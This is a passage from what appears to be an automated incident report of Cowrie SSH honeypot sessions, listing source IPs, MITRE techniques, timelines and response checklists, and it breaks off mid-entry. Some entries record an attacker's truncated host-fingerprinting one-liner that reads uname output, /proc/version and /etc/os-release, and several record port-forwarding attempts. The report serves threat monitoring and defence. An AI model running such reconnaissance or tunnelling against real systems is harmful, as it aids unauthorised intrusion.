| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:30 |
| **Last Seen** | 2026-08-16 09:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:30:17` | `cowrie.session.connect` |
| `2026-08-16 09:30:18` | `cowrie.client.version` |
| `2026-08-16 09:30:18` | `cowrie.client.kex` |
| `2026-08-16 09:30:20` | `cowrie.login.success` |
| `2026-08-16 09:30:21` | `cowrie.session.params` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.success` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.command.input` |
| `2026-08-16 09:30:21` | `cowrie.log.closed` |
| `2026-08-16 09:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11a52c76b967

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-08-16 09:31 |
| **Last Seen** | 2026-08-16 09:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:31:26` | `cowrie.session.connect` |
| `2026-08-16 09:31:27` | `cowrie.client.version` |
| `2026-08-16 09:31:27` | `cowrie.client.kex` |
| `2026-08-16 09:31:28` | `cowrie.login.success` |
| `2026-08-16 09:31:29` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1723bf525c46

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:32 |
| **Last Seen** | 2026-08-16 09:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:32:02` | `cowrie.session.connect` |
| `2026-08-16 09:32:02` | `cowrie.client.version` |
| `2026-08-16 09:32:02` | `cowrie.client.kex` |
| `2026-08-16 09:32:04` | `cowrie.login.success` |
| `2026-08-16 09:32:06` | `cowrie.session.params` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.success` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:06` | `cowrie.command.input` |
| `2026-08-16 09:32:07` | `cowrie.log.closed` |
| `2026-08-16 09:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47796fd9e88

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:33 |
| **Last Seen** | 2026-08-16 09:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:33:44` | `cowrie.session.connect` |
| `2026-08-16 09:33:45` | `cowrie.client.version` |
| `2026-08-16 09:33:45` | `cowrie.client.kex` |
| `2026-08-16 09:33:46` | `cowrie.login.success` |
| `2026-08-16 09:33:48` | `cowrie.session.params` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.success` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.command.input` |
| `2026-08-16 09:33:48` | `cowrie.log.closed` |
| `2026-08-16 09:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0816063a38ab

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-08-16 09:33 |
| **Last Seen** | 2026-08-16 09:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:33:57` | `cowrie.session.connect` |
| `2026-08-16 09:33:58` | `cowrie.client.version` |
| `2026-08-16 09:33:58` | `cowrie.client.kex` |
| `2026-08-16 09:34:00` | `cowrie.login.success` |
| `2026-08-16 09:34:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8e9a54d357

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-16 09:34 |
| **Last Seen** | 2026-08-16 09:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:34:06` | `cowrie.session.connect` |
| `2026-08-16 09:34:07` | `cowrie.client.version` |
| `2026-08-16 09:34:07` | `cowrie.client.kex` |
| `2026-08-16 09:34:09` | `cowrie.login.success` |
| `2026-08-16 09:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a327d16f31f

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 09:34 |
| **Last Seen** | 2026-08-16 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:34:35` | `cowrie.session.connect` |
| `2026-08-16 09:34:35` | `cowrie.client.version` |
| `2026-08-16 09:34:35` | `cowrie.client.kex` |
| `2026-08-16 09:34:36` | `cowrie.login.success` |
| `2026-08-16 09:34:37` | `cowrie.session.params` |
| `2026-08-16 09:34:37` | `cowrie.command.input` |
| `2026-08-16 09:34:37` | `cowrie.log.closed` |
| `2026-08-16 09:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-887dee9be555

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:35 |
| **Last Seen** | 2026-08-16 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:35:28` | `cowrie.session.connect` |
| `2026-08-16 09:35:29` | `cowrie.client.version` |
| `2026-08-16 09:35:29` | `cowrie.client.kex` |
| `2026-08-16 09:35:30` | `cowrie.login.success` |
| `2026-08-16 09:35:31` | `cowrie.session.params` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.success` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:31` | `cowrie.command.input` |
| `2026-08-16 09:35:32` | `cowrie.log.closed` |
| `2026-08-16 09:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a2487613f7

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-08-16 09:36 |
| **Last Seen** | 2026-08-16 09:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:36:18` | `cowrie.session.connect` |
| `2026-08-16 09:36:18` | `cowrie.client.version` |
| `2026-08-16 09:36:18` | `cowrie.client.kex` |
| `2026-08-16 09:36:19` | `cowrie.login.success` |
| `2026-08-16 09:36:19` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-740ace002495

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-08-16 09:36 |
| **Last Seen** | 2026-08-16 09:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:36:25` | `cowrie.session.connect` |
| `2026-08-16 09:36:27` | `cowrie.client.version` |
| `2026-08-16 09:36:27` | `cowrie.client.kex` |
| `2026-08-16 09:36:29` | `cowrie.login.success` |
| `2026-08-16 09:36:29` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18b2cca4278

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:37 |
| **Last Seen** | 2026-08-16 09:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:37:14` | `cowrie.session.connect` |
| `2026-08-16 09:37:14` | `cowrie.client.version` |
| `2026-08-16 09:37:14` | `cowrie.client.kex` |
| `2026-08-16 09:37:16` | `cowrie.login.success` |
| `2026-08-16 09:37:17` | `cowrie.session.params` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.success` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:17` | `cowrie.command.input` |
| `2026-08-16 09:37:18` | `cowrie.log.closed` |
| `2026-08-16 09:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad6a8ba7a7b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:38 |
| **Last Seen** | 2026-08-16 09:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:38:56` | `cowrie.session.connect` |
| `2026-08-16 09:38:56` | `cowrie.client.version` |
| `2026-08-16 09:38:56` | `cowrie.client.kex` |
| `2026-08-16 09:38:58` | `cowrie.login.success` |
| `2026-08-16 09:39:00` | `cowrie.session.params` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.success` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:00` | `cowrie.command.input` |
| `2026-08-16 09:39:01` | `cowrie.log.closed` |
| `2026-08-16 09:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd51622bd1b

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-16 09:39 |
| **Last Seen** | 2026-08-16 09:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:39:02` | `cowrie.session.connect` |
| `2026-08-16 09:39:02` | `cowrie.client.version` |
| `2026-08-16 09:39:02` | `cowrie.client.kex` |
| `2026-08-16 09:39:05` | `cowrie.login.success` |
| `2026-08-16 09:39:05` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11293d0ec2a

| Field | Detail |
|---|---|
| **Source IP** | `170.247.3[.]15` |
| **First Seen** | 2026-08-16 09:39 |
| **Last Seen** | 2026-08-16 09:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:39:08` | `cowrie.session.connect` |
| `2026-08-16 09:39:09` | `cowrie.client.version` |
| `2026-08-16 09:39:09` | `cowrie.client.kex` |
| `2026-08-16 09:39:10` | `cowrie.login.success` |
| `2026-08-16 09:39:11` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.247.3[.]15` to AbuseIPDB if not already reported
- [ ] Block `170.247.3[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5aac016f89

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-16 09:39 |
| **Last Seen** | 2026-08-16 09:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:39:16` | `cowrie.session.connect` |
| `2026-08-16 09:39:17` | `cowrie.client.version` |
| `2026-08-16 09:39:17` | `cowrie.client.kex` |
| `2026-08-16 09:39:18` | `cowrie.login.success` |
| `2026-08-16 09:39:19` | `cowrie.direct-tcpip.request` |
| `2026-08-16 09:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c958adc62a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:42 |
| **Last Seen** | 2026-08-16 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:42:12` | `cowrie.session.connect` |
| `2026-08-16 09:42:13` | `cowrie.client.version` |
| `2026-08-16 09:42:13` | `cowrie.client.kex` |
| `2026-08-16 09:42:14` | `cowrie.login.success` |
| `2026-08-16 09:42:16` | `cowrie.session.params` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.success` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.command.input` |
| `2026-08-16 09:42:16` | `cowrie.log.closed` |
| `2026-08-16 09:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be021d2a97cb

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 09:42 |
| **Last Seen** | 2026-08-16 09:43 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:42:59` | `cowrie.session.connect` |
| `2026-08-16 09:43:06` | `cowrie.client.version` |
| `2026-08-16 09:43:06` | `cowrie.client.kex` |
| `2026-08-16 09:43:31` | `cowrie.login.success` |
| `2026-08-16 09:43:45` | `cowrie.session.params` |
| `2026-08-16 09:43:45` | `cowrie.command.input` |
| `2026-08-16 09:43:53` | `cowrie.log.closed` |
| `2026-08-16 09:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30e13d99d9f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:43 |
| **Last Seen** | 2026-08-16 09:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
